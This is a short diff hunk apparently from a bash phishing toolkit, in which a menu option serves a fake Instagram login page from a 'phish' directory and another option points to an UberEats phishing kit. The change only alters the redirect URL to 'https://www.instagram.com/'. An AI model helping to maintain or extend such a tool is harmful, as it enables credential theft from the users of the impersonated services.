@@ -957,7 +957,7 @@ function banner(){
 		cd $phish/instagram/
 		NOTPF="login.php"
 		YOTPF="posts.php"
-		oldy="https://instagram.com/"
+		oldy="https://www.instagram.com/"
 		decne
 	elif [ $option = 04 ] || [ $option = 4 ];then
                 cd $phish/UberEats-Phishing/
